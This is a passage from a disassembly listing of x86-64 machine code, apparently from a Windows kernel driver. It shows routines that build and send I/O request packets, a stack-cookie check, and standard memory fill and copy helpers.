   13d8e:	33 d2                	xor    %edx,%edx
   13d90:	48 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%rcx
   13d97:	00 
   13d98:	ff 15 b2 13 00 00    	call   *0x13b2(%rip)        # 0x15150
   13d9e:	8b 7c 24 70          	mov    0x70(%rsp),%edi
   13da2:	4d 85 ff             	test   %r15,%r15
   13da5:	74 0d                	je     0x13db4
   13da7:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   13dac:	8b 41 0a             	mov    0xa(%rcx),%eax
   13daf:	41 89 07             	mov    %eax,(%r15)
   13db2:	eb 05                	jmp    0x13db9
   13db4:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   13db9:	4d 85 f6             	test   %r14,%r14
   13dbc:	74 08                	je     0x13dc6
   13dbe:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   13dc2:	66 41 89 06          	mov    %ax,(%r14)
   13dc6:	33 d2                	xor    %edx,%edx
   13dc8:	48 8b ce             	mov    %rsi,%rcx
   13dcb:	ff 15 8f 12 00 00    	call   *0x128f(%rip)        # 0x15060
   13dd1:	85 ff                	test   %edi,%edi
   13dd3:	0f 49 7c 24 78       	cmovns 0x78(%rsp),%edi
   13dd8:	8b c7                	mov    %edi,%eax
   13dda:	48 8b b4 24 08 01 00 	mov    0x108(%rsp),%rsi
   13de1:	00 
   13de2:	48 81 c4 c0 00 00 00 	add    $0xc0,%rsp
   13de9:	41 5f                	pop    %r15
   13deb:	41 5e                	pop    %r14
   13ded:	41 5d                	pop    %r13
   13def:	41 5c                	pop    %r12
   13df1:	5f                   	pop    %rdi
   13df2:	c3                   	ret
   13df3:	cc                   	int3
   13df4:	cc                   	int3
   13df5:	cc                   	int3
   13df6:	cc                   	int3
   13df7:	cc                   	int3
   13df8:	cc                   	int3
   13df9:	cc                   	int3
   13dfa:	cc                   	int3
   13dfb:	cc                   	int3
   13dfc:	48 8b c4             	mov    %rsp,%rax
   13dff:	48 89 70 10          	mov    %rsi,0x10(%rax)
   13e03:	44 89 48 20          	mov    %r9d,0x20(%rax)
   13e07:	44 89 40 18          	mov    %r8d,0x18(%rax)
   13e0b:	48 89 48 08          	mov    %rcx,0x8(%rax)
   13e0f:	57                   	push   %rdi
   13e10:	41 54                	push   %r12
   13e12:	41 55                	push   %r13
   13e14:	41 56                	push   %r14
   13e16:	41 57                	push   %r15
   13e18:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   13e1f:	45 8b f9             	mov    %r9d,%r15d
   13e22:	41 8b f0             	mov    %r8d,%esi
   13e25:	48 8b fa             	mov    %rdx,%rdi
   13e28:	4c 8b f1             	mov    %rcx,%r14
   13e2b:	ff 15 0f 13 00 00    	call   *0x130f(%rip)        # 0x15140
   13e31:	4c 8b e8             	mov    %rax,%r13
   13e34:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   13e39:	45 33 c0             	xor    %r8d,%r8d
   13e3c:	33 d2                	xor    %edx,%edx
   13e3e:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   13e45:	00 
   13e46:	ff 15 cc 12 00 00    	call   *0x12cc(%rip)        # 0x15118
   13e4c:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   13e51:	4c 89 5c 24 40       	mov    %r11,0x40(%rsp)
   13e56:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   13e5d:	00 
   13e5e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   13e63:	c6 44 24 30 01       	movb   $0x1,0x30(%rsp)
   13e68:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   13e6d:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   13e73:	45 33 c9             	xor    %r9d,%r9d
   13e76:	45 33 c0             	xor    %r8d,%r8d
   13e79:	49 8b d5             	mov    %r13,%rdx
   13e7c:	41 8d 49 03          	lea    0x3(%r9),%ecx
   13e80:	ff 15 b2 12 00 00    	call   *0x12b2(%rip)        # 0x15138
   13e86:	4c 8b e0             	mov    %rax,%r12
   13e89:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   13e8e:	48 85 c0             	test   %rax,%rax
   13e91:	75 0a                	jne    0x13e9d
   13e93:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   13e98:	e9 17 01 00 00       	jmp    0x13fb4
   13e9d:	85 f6                	test   %esi,%esi
   13e9f:	0f 84 8e 00 00 00    	je     0x13f33
   13ea5:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   13eab:	45 33 c9             	xor    %r9d,%r9d
   13eae:	45 33 c0             	xor    %r8d,%r8d
   13eb1:	8b d6                	mov    %esi,%edx
   13eb3:	48 8b cf             	mov    %rdi,%rcx
   13eb6:	ff 15 04 12 00 00    	call   *0x1204(%rip)        # 0x150c0
   13ebc:	48 8b f8             	mov    %rax,%rdi
   13ebf:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   13ec4:	48 85 c0             	test   %rax,%rax
   13ec7:	75 13                	jne    0x13edc
   13ec9:	49 8b cc             	mov    %r12,%rcx
   13ecc:	ff 15 86 12 00 00    	call   *0x1286(%rip)        # 0x15158
   13ed2:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   13ed7:	e9 d8 00 00 00       	jmp    0x13fb4
   13edc:	45 33 c0             	xor    %r8d,%r8d
   13edf:	33 d2                	xor    %edx,%edx
   13ee1:	48 8b c8             	mov    %rax,%rcx
   13ee4:	ff 15 be 11 00 00    	call   *0x11be(%rip)        # 0x150a8
   13eea:	33 c0                	xor    %eax,%eax
   13eec:	89 44 24 50          	mov    %eax,0x50(%rsp)
   13ef0:	eb 38                	jmp    0x13f2a
   13ef2:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   13ef7:	48 8b cf             	mov    %rdi,%rcx
   13efa:	ff 15 78 11 00 00    	call   *0x1178(%rip)        # 0x15078
   13f00:	b8 e8 00 00 c0       	mov    $0xc00000e8,%eax
   13f05:	89 44 24 50          	mov    %eax,0x50(%rsp)
   13f09:	44 8b bc 24 e8 00 00 	mov    0xe8(%rsp),%r15d
   13f10:	00 
   13f11:	8b b4 24 e0 00 00 00 	mov    0xe0(%rsp),%esi
   13f18:	4c 8b b4 24 d0 00 00 	mov    0xd0(%rsp),%r14
   13f1f:	00 
   13f20:	4c 8b 6c 24 60       	mov    0x60(%rsp),%r13
   13f25:	4c 8b 64 24 68       	mov    0x68(%rsp),%r12
   13f2a:	85 c0                	test   %eax,%eax
   13f2c:	79 0a                	jns    0x13f38
   13f2e:	e9 81 00 00 00       	jmp    0x13fb4
   13f33:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   13f38:	49 8b 84 24 b8 00 00 	mov    0xb8(%r12),%rax
   13f3f:	00 
   13f40:	48 83 60 f0 00       	andq   $0x0,-0x10(%rax)
   13f45:	48 83 60 f8 00       	andq   $0x0,-0x8(%rax)
   13f4a:	c6 40 bb 00          	movb   $0x0,-0x45(%rax)
   13f4e:	49 8b 84 24 b8 00 00 	mov    0xb8(%r12),%rax
   13f55:	00 
   13f56:	c6 40 b8 0f          	movb   $0xf,-0x48(%rax)
   13f5a:	c6 40 b9 07          	movb   $0x7,-0x47(%rax)
   13f5e:	4c 89 68 e0          	mov    %r13,-0x20(%rax)
   13f62:	4c 89 70 e8          	mov    %r14,-0x18(%rax)
   13f66:	44 89 78 c4          	mov    %r15d,-0x3c(%rax)
   13f6a:	89 70 c0             	mov    %esi,-0x40(%rax)
   13f6d:	f7 de                	neg    %esi
   13f6f:	48 1b c0             	sbb    %rax,%rax
   13f72:	48 23 c7             	and    %rdi,%rax
   13f75:	49 89 44 24 08       	mov    %rax,0x8(%r12)
   13f7a:	49 8b d4             	mov    %r12,%rdx
   13f7d:	49 8b cd             	mov    %r13,%rcx
   13f80:	ff 15 da 11 00 00    	call   *0x11da(%rip)        # 0x15160
   13f86:	3d 03 01 00 00       	cmp    $0x103,%eax
   13f8b:	75 20                	jne    0x13fad
   13f8d:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   13f93:	45 33 c9             	xor    %r9d,%r9d
   13f96:	45 33 c0             	xor    %r8d,%r8d
   13f99:	33 d2                	xor    %edx,%edx
   13f9b:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   13fa2:	00 
   13fa3:	ff 15 a7 11 00 00    	call   *0x11a7(%rip)        # 0x15150
   13fa9:	8b 44 24 70          	mov    0x70(%rsp),%eax
   13fad:	85 c0                	test   %eax,%eax
   13faf:	0f 49 44 24 78       	cmovns 0x78(%rsp),%eax
   13fb4:	48 8b b4 24 d8 00 00 	mov    0xd8(%rsp),%rsi
   13fbb:	00 
   13fbc:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   13fc3:	41 5f                	pop    %r15
   13fc5:	41 5e                	pop    %r14
   13fc7:	41 5d                	pop    %r13
   13fc9:	41 5c                	pop    %r12
   13fcb:	5f                   	pop    %rdi
   13fcc:	c3                   	ret
   13fcd:	cc                   	int3
   13fce:	cc                   	int3
   13fcf:	cc                   	int3
   13fd0:	cc                   	int3
   13fd1:	cc                   	int3
   13fd2:	cc                   	int3
   13fd3:	cc                   	int3
   13fd4:	48 8b c4             	mov    %rsp,%rax
   13fd7:	48 89 70 10          	mov    %rsi,0x10(%rax)
   13fdb:	44 89 48 20          	mov    %r9d,0x20(%rax)
   13fdf:	44 89 40 18          	mov    %r8d,0x18(%rax)
   13fe3:	48 89 48 08          	mov    %rcx,0x8(%rax)
   13fe7:	57                   	push   %rdi
   13fe8:	41 54                	push   %r12
   13fea:	41 55                	push   %r13
   13fec:	41 56                	push   %r14
   13fee:	41 57                	push   %r15
   13ff0:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   13ff7:	45 8b f9             	mov    %r9d,%r15d
   13ffa:	41 8b f0             	mov    %r8d,%esi
   13ffd:	48 8b fa             	mov    %rdx,%rdi
   14000:	4c 8b f1             	mov    %rcx,%r14
   14003:	ff 15 37 11 00 00    	call   *0x1137(%rip)        # 0x15140
   14009:	4c 8b e8             	mov    %rax,%r13
   1400c:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14011:	45 33 c0             	xor    %r8d,%r8d
   14014:	33 d2                	xor    %edx,%edx
   14016:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   1401d:	00 
   1401e:	ff 15 f4 10 00 00    	call   *0x10f4(%rip)        # 0x15118
   14024:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   14029:	4c 89 5c 24 40       	mov    %r11,0x40(%rsp)
   1402e:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   14035:	00 
   14036:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1403b:	c6 44 24 30 01       	movb   $0x1,0x30(%rsp)
   14040:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14045:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1404b:	45 33 c9             	xor    %r9d,%r9d
   1404e:	45 33 c0             	xor    %r8d,%r8d
   14051:	49 8b d5             	mov    %r13,%rdx
   14054:	41 8d 49 03          	lea    0x3(%r9),%ecx
   14058:	ff 15 da 10 00 00    	call   *0x10da(%rip)        # 0x15138
   1405e:	4c 8b e0             	mov    %rax,%r12
   14061:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   14066:	48 85 c0             	test   %rax,%rax
   14069:	75 0a                	jne    0x14075
   1406b:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   14070:	e9 18 01 00 00       	jmp    0x1418d
   14075:	85 f6                	test   %esi,%esi
   14077:	0f 84 8f 00 00 00    	je     0x1410c
   1407d:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14083:	45 33 c9             	xor    %r9d,%r9d
   14086:	45 33 c0             	xor    %r8d,%r8d
   14089:	8b d6                	mov    %esi,%edx
   1408b:	48 8b cf             	mov    %rdi,%rcx
   1408e:	ff 15 2c 10 00 00    	call   *0x102c(%rip)        # 0x150c0
   14094:	48 8b f8             	mov    %rax,%rdi
   14097:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   1409c:	48 85 c0             	test   %rax,%rax
   1409f:	75 13                	jne    0x140b4
   140a1:	49 8b cc             	mov    %r12,%rcx
   140a4:	ff 15 ae 10 00 00    	call   *0x10ae(%rip)        # 0x15158
   140aa:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   140af:	e9 d9 00 00 00       	jmp    0x1418d
   140b4:	33 d2                	xor    %edx,%edx
   140b6:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140ba:	48 8b c8             	mov    %rax,%rcx
   140bd:	ff 15 e5 0f 00 00    	call   *0xfe5(%rip)        # 0x150a8
   140c3:	33 c0                	xor    %eax,%eax
   140c5:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140c9:	eb 38                	jmp    0x14103
   140cb:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140d0:	48 8b cf             	mov    %rdi,%rcx
   140d3:	ff 15 9f 0f 00 00    	call   *0xf9f(%rip)        # 0x15078
   140d9:	b8 e8 00 00 c0       	mov    $0xc00000e8,%eax
   140de:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140e2:	44 8b bc 24 e8 00 00 	mov    0xe8(%rsp),%r15d
   140e9:	00 
   140ea:	8b b4 24 e0 00 00 00 	mov    0xe0(%rsp),%esi
   140f1:	4c 8b b4 24 d0 00 00 	mov    0xd0(%rsp),%r14
   140f8:	00 
   140f9:	4c 8b 6c 24 60       	mov    0x60(%rsp),%r13
   140fe:	4c 8b 64 24 68       	mov    0x68(%rsp),%r12
   14103:	85 c0                	test   %eax,%eax
   14105:	79 0a                	jns    0x14111
   14107:	e9 81 00 00 00       	jmp    0x1418d
   1410c:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   14111:	49 8b 84 24 b8 00 00 	mov    0xb8(%r12),%rax
   14118:	00 
   14119:	48 83 60 f0 00       	andq   $0x0,-0x10(%rax)
   1411e:	48 83 60 f8 00       	andq   $0x0,-0x8(%rax)
   14123:	c6 40 bb 00          	movb   $0x0,-0x45(%rax)
   14127:	49 8b 84 24 b8 00 00 	mov    0xb8(%r12),%rax
   1412e:	00 
   1412f:	c6 40 b8 0f          	movb   $0xf,-0x48(%rax)
   14133:	c6 40 b9 08          	movb   $0x8,-0x47(%rax)
   14137:	4c 89 68 e0          	mov    %r13,-0x20(%rax)
   1413b:	4c 89 70 e8          	mov    %r14,-0x18(%rax)
   1413f:	44 89 78 c4          	mov    %r15d,-0x3c(%rax)
   14143:	89 70 c0             	mov    %esi,-0x40(%rax)
   14146:	f7 de                	neg    %esi
   14148:	48 1b c0             	sbb    %rax,%rax
   1414b:	48 23 c7             	and    %rdi,%rax
   1414e:	49 89 44 24 08       	mov    %rax,0x8(%r12)
   14153:	49 8b d4             	mov    %r12,%rdx
   14156:	49 8b cd             	mov    %r13,%rcx
   14159:	ff 15 01 10 00 00    	call   *0x1001(%rip)        # 0x15160
   1415f:	3d 03 01 00 00       	cmp    $0x103,%eax
   14164:	75 20                	jne    0x14186
   14166:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1416c:	45 33 c9             	xor    %r9d,%r9d
   1416f:	45 33 c0             	xor    %r8d,%r8d
   14172:	33 d2                	xor    %edx,%edx
   14174:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   1417b:	00 
   1417c:	ff 15 ce 0f 00 00    	call   *0xfce(%rip)        # 0x15150
   14182:	8b 44 24 70          	mov    0x70(%rsp),%eax
   14186:	85 c0                	test   %eax,%eax
   14188:	0f 49 44 24 78       	cmovns 0x78(%rsp),%eax
   1418d:	48 8b b4 24 d8 00 00 	mov    0xd8(%rsp),%rsi
   14194:	00 
   14195:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   1419c:	41 5f                	pop    %r15
   1419e:	41 5e                	pop    %r14
   141a0:	41 5d                	pop    %r13
   141a2:	41 5c                	pop    %r12
   141a4:	5f                   	pop    %rdi
   141a5:	c3                   	ret
   141a6:	cc                   	int3
   141a7:	cc                   	int3
   141a8:	cc                   	int3
   141a9:	cc                   	int3
   141aa:	cc                   	int3
   141ab:	cc                   	int3
   141ac:	cc                   	int3
   141ad:	cc                   	int3
   141ae:	cc                   	int3
   141af:	cc                   	int3
   141b0:	cc                   	int3
   141b1:	cc                   	int3
   141b2:	cc                   	int3
   141b3:	cc                   	int3
   141b4:	cc                   	int3
   141b5:	cc                   	int3
   141b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   141bd:	00 00 00 
   141c0:	48 3b 0d 39 1f 00 00 	cmp    0x1f39(%rip),%rcx        # 0x16100
   141c7:	75 12                	jne    0x141db
   141c9:	48 c1 c1 10          	rol    $0x10,%rcx
   141cd:	66 f7 c1 ff ff       	test   $0xffff,%cx
   141d2:	75 03                	jne    0x141d7
   141d4:	c2 00 00             	ret    $0x0
   141d7:	48 c1 c9 10          	ror    $0x10,%rcx
   141db:	e9 08 00 00 00       	jmp    0x141e8
   141e0:	cc                   	int3
   141e1:	cc                   	int3
   141e2:	cc                   	int3
   141e3:	cc                   	int3
   141e4:	cc                   	int3
   141e5:	cc                   	int3
   141e6:	cc                   	int3
   141e7:	cc                   	int3
   141e8:	48 83 ec 38          	sub    $0x38,%rsp
   141ec:	4c 8b 0d 15 1f 00 00 	mov    0x1f15(%rip),%r9        # 0x16108
   141f3:	4c 8b 05 06 1f 00 00 	mov    0x1f06(%rip),%r8        # 0x16100
   141fa:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14200:	48 8b d1             	mov    %rcx,%rdx
   14203:	b9 f7 00 00 00       	mov    $0xf7,%ecx
   14208:	ff 15 5a 0f 00 00    	call   *0xf5a(%rip)        # 0x15168
   1420e:	cc                   	int3
   1420f:	cc                   	int3
   14210:	cc                   	int3
   14211:	cc                   	int3
   14212:	cc                   	int3
   14213:	cc                   	int3
   14214:	cc                   	int3
   14215:	cc                   	int3
   14216:	ff 25 ac 0e 00 00    	jmp    *0xeac(%rip)        # 0x150c8
   1421c:	cc                   	int3
   1421d:	cc                   	int3
   1421e:	cc                   	int3
   1421f:	cc                   	int3
   14220:	cc                   	int3
   14221:	cc                   	int3
   14222:	ff 25 a8 0e 00 00    	jmp    *0xea8(%rip)        # 0x150d0
   14228:	cc                   	int3
   14229:	cc                   	int3
   1422a:	cc                   	int3
   1422b:	cc                   	int3
   1422c:	cc                   	int3
   1422d:	cc                   	int3
   1422e:	cc                   	int3
   1422f:	cc                   	int3
   14230:	cc                   	int3
   14231:	cc                   	int3
   14232:	cc                   	int3
   14233:	cc                   	int3
   14234:	cc                   	int3
   14235:	cc                   	int3
   14236:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1423d:	00 00 00 
   14240:	48 8b c1             	mov    %rcx,%rax
   14243:	49 83 f8 08          	cmp    $0x8,%r8
   14247:	72 53                	jb     0x1429c
   14249:	0f b6 d2             	movzbl %dl,%edx
   1424c:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   14253:	01 01 01 
   14256:	49 0f af d1          	imul   %r9,%rdx
   1425a:	49 83 f8 40          	cmp    $0x40,%r8
   1425e:	72 1e                	jb     0x1427e
   14260:	48 f7 d9             	neg    %rcx
   14263:	83 e1 07             	and    $0x7,%ecx
   14266:	74 06                	je     0x1426e
   14268:	4c 2b c1             	sub    %rcx,%r8
   1426b:	48 89 10             	mov    %rdx,(%rax)
   1426e:	48 03 c8             	add    %rax,%rcx
   14271:	4d 8b c8             	mov    %r8,%r9
   14274:	49 83 e0 3f          	and    $0x3f,%r8
   14278:	49 c1 e9 06          	shr    $0x6,%r9
   1427c:	75 39                	jne    0x142b7
   1427e:	4d 8b c8             	mov    %r8,%r9
   14281:	49 83 e0 07          	and    $0x7,%r8
   14285:	49 c1 e9 03          	shr    $0x3,%r9
   14289:	74 11                	je     0x1429c
   1428b:	66 66 66 90          	data16 data16 xchg %ax,%ax
   1428f:	90                   	nop
   14290:	48 89 11             	mov    %rdx,(%rcx)
   14293:	48 83 c1 08          	add    $0x8,%rcx
   14297:	49 ff c9             	dec    %r9
   1429a:	75 f4                	jne    0x14290
   1429c:	4d 85 c0             	test   %r8,%r8
   1429f:	74 0a                	je     0x142ab
   142a1:	88 11                	mov    %dl,(%rcx)
   142a3:	48 ff c1             	inc    %rcx
   142a6:	49 ff c8             	dec    %r8
   142a9:	75 f6                	jne    0x142a1
   142ab:	c2 00 00             	ret    $0x0
   142ae:	66 90                	xchg   %ax,%ax
   142b0:	66 66 66 90          	data16 data16 xchg %ax,%ax
   142b4:	66 66 90             	data16 xchg %ax,%ax
   142b7:	49 81 f9 00 1c 00 00 	cmp    $0x1c00,%r9
   142be:	73 30                	jae    0x142f0
   142c0:	48 89 11             	mov    %rdx,(%rcx)
   142c3:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   142c7:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   142cb:	48 83 c1 40          	add    $0x40,%rcx
   142cf:	48 89 51 d8          	mov    %rdx,-0x28(%rcx)
   142d3:	48 89 51 e0          	mov    %rdx,-0x20(%rcx)
   142d7:	49 ff c9             	dec    %r9
   142da:	48 89 51 e8          	mov    %rdx,-0x18(%rcx)
   142de:	48 89 51 f0          	mov    %rdx,-0x10(%rcx)
   142e2:	48 89 51 f8          	mov    %rdx,-0x8(%rcx)
   142e6:	75 d8                	jne    0x142c0
   142e8:	eb 94                	jmp    0x1427e
   142ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   142f0:	48 0f c3 11          	movnti %rdx,(%rcx)
   142f4:	48 0f c3 51 08       	movnti %rdx,0x8(%rcx)
   142f9:	48 0f c3 51 10       	movnti %rdx,0x10(%rcx)
   142fe:	48 83 c1 40          	add    $0x40,%rcx
   14302:	48 0f c3 51 d8       	movnti %rdx,-0x28(%rcx)
   14307:	48 0f c3 51 e0       	movnti %rdx,-0x20(%rcx)
   1430c:	49 ff c9             	dec    %r9
   1430f:	48 0f c3 51 e8       	movnti %rdx,-0x18(%rcx)
   14314:	48 0f c3 51 f0       	movnti %rdx,-0x10(%rcx)
   14319:	48 0f c3 51 f8       	movnti %rdx,-0x8(%rcx)
   1431e:	75 d0                	jne    0x142f0
   14320:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   14325:	e9 54 ff ff ff       	jmp    0x1427e
   1432a:	cc                   	int3
   1432b:	cc                   	int3
   1432c:	cc                   	int3
   1432d:	cc                   	int3
   1432e:	cc                   	int3
   1432f:	cc                   	int3
   14330:	cc                   	int3
   14331:	cc                   	int3
   14332:	cc                   	int3
   14333:	cc                   	int3
   14334:	cc                   	int3
   14335:	cc                   	int3
   14336:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1433d:	00 00 00 
   14340:	4c 8b d9             	mov    %rcx,%r11
   14343:	48 2b d1             	sub    %rcx,%rdx
   14346:	0f 82 9e 01 00 00    	jb     0x144ea
   1434c:	49 83 f8 08          	cmp    $0x8,%r8
   14350:	72 62                	jb     0x143b4
   14352:	f6 c1 07             	test   $0x7,%cl
   14355:	74 37                	je     0x1438e
   14357:	f6 c1 01             	test   $0x1,%cl
   1435a:	74 0c                	je     0x14368
   1435c:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   1435f:	49 ff c8             	dec    %r8
   14362:	88 01                	mov    %al,(%rcx)
   14364:	48 83 c1 01          	add    $0x1,%rcx
   14368:	f6 c1 02             	test   $0x2,%cl
   1436b:	74 0f                	je     0x1437c
   1436d:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   14371:	49 83 e8 02          	sub    $0x2,%r8
   14375:	66 89 01             	mov    %ax,(%rcx)
   14378:	48 83 c1 02          	add    $0x2,%rcx
   1437c:	f6 c1 04             	test   $0x4,%cl
   1437f:	74 0d                	je     0x1438e
   14381:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   14384:	49 83 e8 04          	sub    $0x4,%r8
   14388:	89 01                	mov    %eax,(%rcx)
   1438a:	48 83 c1 04          	add    $0x4,%rcx
   1438e:	4d 8b c8             	mov    %r8,%r9
   14391:	49 c1 e9 05          	shr    $0x5,%r9
   14395:	75 50                	jne    0x143e7
   14397:	4d 8b c8             	mov    %r8,%r9
   1439a:	49 c1 e9 03          	shr    $0x3,%r9
   1439e:	74 14                	je     0x143b4
   143a0:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   143a4:	48 89 01             	mov    %rax,(%rcx)
   143a7:	48 83 c1 08          	add    $0x8,%rcx
   143ab:	49 ff c9             	dec    %r9
   143ae:	75 f0                	jne    0x143a0
   143b0:	49 83 e0 07          	and    $0x7,%r8
   143b4:	4d 85 c0             	test   %r8,%r8
   143b7:	75 07                	jne    0x143c0
   143b9:	49 8b c3             	mov    %r11,%rax
   143bc:	c3                   	ret
   143bd:	0f 1f 00             	nopl   (%rax)
   143c0:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   143c3:	88 01                	mov    %al,(%rcx)
   143c5:	48 ff c1             	inc    %rcx
   143c8:	49 ff c8             	dec    %r8
   143cb:	75 f3                	jne    0x143c0
   143cd:	49 8b c3             	mov    %r11,%rax
   143d0:	c3                   	ret
   143d1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   143d8:	0f 1f 84 00 00 00 00 
   143df:	00 
   143e0:	66 66 66 90          	data16 data16 xchg %ax,%ax
   143e4:	66 66 90             	data16 xchg %ax,%ax
   143e7:	49 81 f9 00 20 00 00 	cmp    $0x2000,%r9
   143ee:	73 42                	jae    0x14432
   143f0:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   143f4:	4c 8b 54 0a 08       	mov    0x8(%rdx,%rcx,1),%r10
   143f9:	48 83 c1 20          	add    $0x20,%rcx
   143fd:	48 89 41 e0          	mov    %rax,-0x20(%rcx)
   14401:	4c 89 51 e8          	mov    %r10,-0x18(%rcx)
   14405:	48 8b 44 0a f0       	mov    -0x10(%rdx,%rcx,1),%rax
   1440a:	4c 8b 54 0a f8       	mov    -0x8(%rdx,%rcx,1),%r10
   1440f:	49 ff c9             	dec    %r9
   14412:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
   14416:	4c 89 51 f8          	mov    %r10,-0x8(%rcx)
   1441a:	75 d4                	jne    0x143f0
   1441c:	49 83 e0 1f          	and    $0x1f,%r8
   14420:	e9 72 ff ff ff       	jmp    0x14397
   14425:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1442c:	00 00 00 00 
   14430:	66 90                	xchg   %ax,%ax
   14432:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14439:	72 b5                	jb     0x143f0
   1443b:	b8 20 00 00 00       	mov    $0x20,%eax
   14440:	0f 18 04 0a          	prefetchnta (%rdx,%rcx,1)
   14444:	0f 18 44 0a 40       	prefetchnta 0x40(%rdx,%rcx,1)
   14449:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   14450:	ff c8                	dec    %eax
   14452:	75 ec                	jne    0x14440
   14454:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   1445b:	b8 40 00 00 00       	mov    $0x40,%eax
   14460:	4c 8b 0c 0a          	mov    (%rdx,%rcx,1),%r9
   14464:	4c 8b 54 0a 08       	mov    0x8(%rdx,%rcx,1),%r10
   14469:	4c 0f c3 09          	movnti %r9,(%rcx)
   1446d:	4c 0f c3 51 08       	movnti %r10,0x8(%rcx)
   14472:	4c 8b 4c 0a 10       	mov    0x10(%rdx,%rcx,1),%r9
   14477:	4c 8b 54 0a 18       	mov    0x18(%rdx,%rcx,1),%r10
   1447c:	4c 0f c3 49 10       	movnti %r9,0x10(%rcx)
   14481:	4c 0f c3 51 18       	movnti %r10,0x18(%rcx)
   14486:	4c 8b 4c 0a 20       	mov    0x20(%rdx,%rcx,1),%r9
   1448b:	4c 8b 54 0a 28       	mov    0x28(%rdx,%rcx,1),%r10
   14490:	48 83 c1 40          	add    $0x40,%rcx
   14494:	4c 0f c3 49 e0       	movnti %r9,-0x20(%rcx)
   14499:	4c 0f c3 51 e8       	movnti %r10,-0x18(%rcx)
   1449e:	4c 8b 4c 0a f0       	mov    -0x10(%rdx,%rcx,1),%r9
   144a3:	4c 8b 54 0a f8       	mov    -0x8(%rdx,%rcx,1),%r10
   144a8:	ff c8                	dec    %eax
   144aa:	4c 0f c3 49 f0       	movnti %r9,-0x10(%rcx)
   144af:	4c 0f c3 51 f8       	movnti %r10,-0x8(%rcx)
   144b4:	75 aa                	jne    0x14460
   144b6:	49 81 e8 00 10 00 00 	sub    $0x1000,%r8
   144bd:	49 81 f8 00 10 00 00 	cmp    $0x1000,%r8
   144c4:	0f 83 71 ff ff ff    	jae    0x1443b
   144ca:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   144cf:	e9 ba fe ff ff       	jmp    0x1438e
   144d4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   144db:	00 00 00 00 00 
   144e0:	66 66 66 90          	data16 data16 xchg %ax,%ax
   144e4:	66 66 66 90          	data16 data16 xchg %ax,%ax
   144e8:	66 90                	xchg   %ax,%ax
   144ea:	49 03 c8             	add    %r8,%rcx
   144ed:	49 83 f8 08          	cmp    $0x8,%r8
   144f1:	72 61                	jb     0x14554
   144f3:	f6 c1 07             	test   $0x7,%cl
   144f6:	74 36                	je     0x1452e
   144f8:	f6 c1 01             	test   $0x1,%cl
   144fb:	74 0b                	je     0x14508
   144fd:	48 ff c9             	dec    %rcx
